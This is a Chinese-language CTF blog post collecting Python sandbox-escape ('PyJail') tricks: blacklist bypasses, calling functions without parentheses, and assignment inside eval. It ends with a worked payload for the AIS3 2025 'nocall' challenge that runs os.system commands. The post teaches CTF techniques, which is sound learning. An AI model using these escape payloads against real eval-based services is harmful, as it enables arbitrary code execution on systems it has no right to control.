<!DOCTYPE html>
<html>
<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
    <script type="text/javascript">
        (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "nq90i0uzl9");
    </script>
    <!-- Microsoft Clarity ends-->
    <!-- Google tag (gtag.js) begins-->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'AW-16453505124');
    </script>
    <!-- Google tag (gtag.js) ends-->
    <!-- hexo injector head_begin end -->
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    一些 PyJail 的筆記 丨
    

    TriangleSnake&#39;s Blog
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">TriangleSnake&#39;s Blog</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">一些 PyJail 的筆記</div>
  <div class="post-meta">
    <div class="date">2025 十二月 31日</div>
    <div class="tags">
      
      <div class="tag-item">CTF</div>
      
      <div class="tag-item">pyjail</div>
      
    </div>
  </div>
  

  <main class="post-content"><p>2025 年即將結束，今年也打了不少 CTF，其中不乏一些有趣的 pyjail，所以特別整理了一些 PyJail 的 tricks 和大家分享，最後也會放一些遇到的有趣題目。</p>
<h1 id="黑名單-bypass"><a href="#黑名單-bypass" class="headerlink" title="黑名單 bypass"></a>黑名單 bypass</h1><ul>
<li><p>空格 -&gt; \t</p>
</li>
<li><p>底線：<br>  可以用全形繞過，但是 <code>.</code> 後面一定要接半形的 <code>_</code>，後面就可以用全形</p>
  <pre><code class="highlight python">blacklist = [<span class="string">&quot;__&quot;</span>,<span class="string">&quot;.__&quot;</span>]
<span class="meta">&gt;&gt;&gt; </span>copyright._＿<span class="keyword">class</span>＿＿
&lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;</code></pre></li>
<li><p>ASCII Bypass：<br>  python 3.7 之後支援使用斜體寫程式<br>  <img src="/2025/12/31/%E4%B8%80%E4%BA%9Bpyjail%E7%9A%84%E7%AD%86%E8%A8%98/1.png" alt="alt text"></p>
<p>  可以透過 <a target="_blank" rel="noopener" href="https://lingojam.com/ItalicTextGenerator">這個網站</a> 弄出斜體</p>
<p>  <em>(Source: <a target="_blank" rel="noopener" href="https://blog.pepsipu.com/posts/albatross-redpwnctf">https://blog.pepsipu.com/posts/albatross-redpwnctf</a>)</em></p>
</li>
</ul>
<h1 id="Call-Function-without-Parentheses"><a href="#Call-Function-without-Parentheses" class="headerlink" title="Call Function without Parentheses"></a>Call Function without Parentheses</h1><p>沒有括號也可以呼叫函式，大部份的作法都是把某些運算子或是會自動 call 的 function 蓋掉改成你想執行的 function</p>
<h2 id="蓋運算子"><a href="#蓋運算子" class="headerlink" title="蓋運算子"></a>蓋運算子</h2><p>如果你想 call <code>breakpoint()</code>，你可以把一些 Class 的 magic method 蓋掉，比如 <code>__neg__</code>，<code>__pos__</code> 等一元運算子</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>license.__class__.__neg__=<span class="built_in">breakpoint</span>
<span class="meta">&gt;&gt;&gt; </span>-license
&gt; &lt;python-<span class="built_in">input</span>-<span class="number">32</span>&gt;(<span class="number">1</span>)&lt;module&gt;()
(Pdb) q</code></pre>

<blockquote>
<p><code>-license</code> 等價於 <code>license.__neg__()</code></p>
</blockquote>
<p>如果你想帶參數呼叫函式的話，可以覆蓋二元運算子</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>license.__class__.__add__=<span class="built_in">print</span>
<span class="meta">&gt;&gt;&gt; </span>license+<span class="string">&quot;hello world&quot;</span>
hello world</code></pre>
<blockquote>
<p><code>license+&quot;hello world&quot;</code> 等價於 <code>license.__add__(&quot;hello world&quot;)</code></p>
</blockquote>
<p>但這邊要注意的是 built-in static type 是 immutable 的，所以你不能覆蓋裡面的 magic method，所以必須找自訂的 class 或是內建 mutable 的 class</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__neg__=<span class="built_in">print</span>
Traceback (most recent call last):
  File <span class="string">&quot;&lt;python-input-35&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;
    <span class="built_in">str</span>.__neg__=<span class="built_in">print</span>
    ^^^^^^^^^^^
TypeError: cannot <span class="built_in">set</span> <span class="string">&#x27;__neg__&#x27;</span> attribute of immutable <span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span></code></pre>

<h2 id="蓋-str"><a href="#蓋-str" class="headerlink" title="蓋 __str__"></a>蓋 __str__</h2><p>跟上面的蓋運算子很像，只是改用 <code>f&quot;&#123;foo&#125;&quot;</code> 來觸發 function call</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>license.__class__.__str__=<span class="built_in">breakpoint</span>
<span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;<span class="subst">&#123;license&#125;</span>&quot;</span>
&gt; &lt;python-<span class="built_in">input</span>-<span class="number">37</span>&gt;(<span class="number">1</span>)&lt;module&gt;()
(Pdb) q</code></pre>
<h2 id="Decorator"><a href="#Decorator" class="headerlink" title="Decorator"></a>Decorator</h2><p>左轉參考 <a target="_blank" rel="noopener" href="https://blog.vincent55.tw/posts/python-without-parentheses/">Vincent55 的文章</a></p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>@<span class="built_in">exec</span>
<span class="meta">... </span>@<span class="string">&quot;__import__\x28&#x27;os&#x27;\x29.system\x28&#x27;id&#x27;\x29&quot;</span>.<span class="built_in">format</span>
<span class="meta">... </span><span class="keyword">class</span> <span class="title class_">Z</span>:
<span class="meta">... </span>    <span class="keyword">pass</span>
...
uid=<span class="number">1000</span>(trianglesnake) gid=<span class="number">1000</span>(trianglesnake) groups=<span class="number">1000</span>(trianglesnake)</code></pre>

<h1 id="賦值"><a href="#賦值" class="headerlink" title="賦值"></a>賦值</h1><p><code>exec()</code> 可以直接賦值，但是 <code>eval()</code> 只能傳入 expression (簡單來說就是 <code>foo=</code> 右邊可以放的東西)</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;foo=1&quot;</span>)
Traceback (most recent call last):
  File <span class="string">&quot;&lt;python-input-9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;
    <span class="built_in">eval</span>(<span class="string">&quot;foo=1&quot;</span>)
    ~~~~^^^^^^^^^
  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>
    foo=<span class="number">1</span>
       ^
SyntaxError: invalid syntax
&gt;&gt;</code></pre>

<h2 id="Walrus-Operator"><a href="#Walrus-Operator" class="headerlink" title="Walrus Operator"></a>Walrus Operator</h2><p>海象表達式是 python 3.8 之後引進的語法糖，可以讓程式碼更直觀簡潔：</p>
<p>例如：<br>如果 x 有值則 print 出來</p>
<pre><code class="highlight python">x = get_data()
<span class="keyword">if</span> x:
    <span class="built_in">print</span>(x)</code></pre>

<p>可以簡化成：</p>
<pre><code class="highlight python"><span class="keyword">if</span> (x := get_data()):
    <span class="built_in">print</span>(x)</code></pre>

<p>我們可以利用 <code>:=</code> 繞過 <code>eval</code> 沒辦法使用 <code>=</code> 的限制：</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;&#123;foo:=1&#125;&quot;</span>)
&#123;<span class="number">1</span>&#125;</code></pre>

<p>但是海象表達式有一個限制，那就是沒辦法覆蓋 Non-Name Assignment 的 Targets，像是 Attribute Access 或者 Subscript Access，白話來說就是不能覆蓋 <code>foo.bar</code> 或是 <code>foo[bar]</code></p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;&#123;foo.bar:=1&#125;&quot;</span>)
Traceback (most recent call last):
  File <span class="string">&quot;&lt;python-input-16&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;
    <span class="built_in">eval</span>(<span class="string">&quot;&#123;foo.bar:=1&#125;&quot;</span>)
    ~~~~^^^^^^^^^^^^^^^^
  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>
    &#123;foo.bar:=<span class="number">1</span>&#125;
     ^^^^^^^
SyntaxError: cannot use assignment expressions <span class="keyword">with</span> attribute
<span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;&#123;foo[bar]:=1&#125;&quot;</span>)
Traceback (most recent call last):
  File <span class="string">&quot;&lt;python-input-17&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;
    <span class="built_in">eval</span>(<span class="string">&quot;&#123;foo[bar]:=1&#125;&quot;</span>)
    ~~~~^^^^^^^^^^^^^^^^^
  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>
    &#123;foo[bar]:=<span class="number">1</span>&#125;
     ^^^^^^^^
SyntaxError: cannot use assignment expressions <span class="keyword">with</span> subscript
&gt;&gt;&gt;</code></pre>

<p>因此我們要來介紹下一種方法，使用 for 來賦值</p>
<h2 id="For-Loop"><a href="#For-Loop" class="headerlink" title="For Loop"></a>For Loop</h2><p><code>for i in range(10)</code> 基本上就是把 <code>i</code> 一直覆蓋掉，所以我們當然也可以把 <code>i</code> 換成我們想覆蓋的東西：</p>
<pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">f&quot;<span class="subst">&#123;license&#125;</span>&quot;</span> <span class="keyword">for</span> license._Printer__setup <span class="keyword">in</span> &#123;<span class="built_in">breakpoint</span>&#125;&#125;
&gt; &lt;frozen _sitebuiltins&gt;(<span class="number">61</span>)__repr__()
(Pdb) q</code></pre>

<h1 id="SSTI-in-Python"><a href="#SSTI-in-Python" class="headerlink" title="SSTI in Python"></a>SSTI in Python</h1><h1 id="一些題目"><a href="#一些題目" class="headerlink" title="一些題目"></a>一些題目</h1><h2 id="nocall-2025-AIS3-Pre-Exam-Hard"><a href="#nocall-2025-AIS3-Pre-Exam-Hard" class="headerlink" title="nocall (2025 AIS3 Pre-Exam Hard)"></a>nocall (2025 AIS3 Pre-Exam Hard)</h2><pre><code class="highlight python"><span class="keyword">import</span> unicodedata

<span class="built_in">print</span>(<span class="built_in">open</span>(__file__).read())
expr = unicodedata.normalize(<span class="string">&quot;NFKC&quot;</span>, <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>))
<span class="keyword">if</span> <span class="string">&quot;._&quot;</span> <span class="keyword">in</span> expr:
    <span class="keyword">raise</span> NameError(<span class="string">&quot;no __ %r&quot;</span> % expr)
<span class="keyword">if</span> <span class="string">&quot;breakpoint&quot;</span> <span class="keyword">in</span> expr:
    <span class="keyword">raise</span> NameError(<span class="string">&quot;no breakpoint %r&quot;</span> % expr)
<span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> <span class="string">&quot;([ ])&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> expr]):
    <span class="keyword">raise</span> NameError(<span class="string">&quot;no ([ ]) %r&quot;</span> % expr)
<span class="comment"># baby version: response for free OUO</span>
result = <span class="built_in">eval</span>(expr)
<span class="built_in">print</span>(result)</code></pre>

<p>這題用到 <code>eval</code>，並且不能使用 <code> </code> 、 <code>._</code>、<code>breakpoint</code>、<code>(</code>、<code>)</code>、<code>[</code>、<code>]</code>，我們可以分化一下問題：</p>
<ul>
<li><code>eval</code> 可以使用上面提到的方法賦值</li>
<li><code>._</code> 可以透過 <code>foo. __class__</code> 繞過</li>
<li><code> </code> 可以用 <code>\t</code> 繞過</li>
</ul>
<p>在最後面有提示 <code>respose for free</code>，我們可以嘗試把 <code>print</code> 蓋成 <code>exec</code></p>
<ol>
<li>想辦法把 <code>print</code> 蓋掉： <pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>expr = <span class="string">&quot;&#123;print:=exec&#125;&quot;</span></code></pre>
 但是此時 <code>result</code> 會變成 <code>&#123;&lt;built-in function exec&gt;&#125;</code>，因此我們需要構造一個 polyglot payload 讓 <code>result</code> 等於我們想執行的 python code，同時讓 <code>eval(expr)</code> 把 <code>print</code> 蓋掉並且不會噴錯</li>
<li>構造 payload：<br> 假設我們想執行 <code>__import__(&#39;os&#39;).system(&#39;whoami&#39;)</code>，我們可以把海象表達式會出現的 dict 想辦法接在 payload 後面並使用 <code>#</code> 把它變成註解，這樣塞到後面的 <code>eval</code> 時便會自動被忽略  <pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span>expr = <span class="string">&quot;\&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)#\&quot;+&#123;print:=eval&#125;&quot;</span></code></pre>
 但是這邊還有一個問題就是 str 沒辦法和 dict 直接相加，我們要想辦法把 {} 變成可以和 str 相加的東西</li>
<li>想辦法把 <code>&#123;&lt;built-in function eval&gt;&#125;</code> 變成 string： <pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(&#123;<span class="built_in">print</span>:=<span class="built_in">eval</span>&#125;)
[<span class="string">&#x27;__and__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__class_getitem__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getstate__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__iand__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>, <span class="string">&#x27;__ior__&#x27;</span>, <span class="string">&#x27;__isub__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__ixor__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__or__&#x27;</span>, <span class="string">&#x27;__rand__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__ror__&#x27;</span>, <span class="string">&#x27;__rsub__&#x27;</span>, <span class="string">&#x27;__rxor__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__xor__&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;difference&#x27;</span>, <span class="string">&#x27;difference_update&#x27;</span>, <span class="string">&#x27;discard&#x27;</span>, <span class="string">&#x27;intersection&#x27;</span>, <span class="string">&#x27;intersection_update&#x27;</span>, <span class="string">&#x27;isdisjoint&#x27;</span>, <span class="string">&#x27;issubset&#x27;</span>, <span class="string">&#x27;issuperset&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;symmetric_difference&#x27;</span>, <span class="string">&#x27;symmetric_difference_update&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;update&#x27;</span>]</code></pre>
 <code>__doc__</code> 很明顯可以拿來用，因為它是一段文字</li>
<li>最終 payload： <pre><code class="highlight python"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)#&quot;</span> + &#123;<span class="built_in">print</span>:=<span class="built_in">eval</span>&#125;.	__doc__</code></pre></li>
</ol>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © TriangleSnake</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>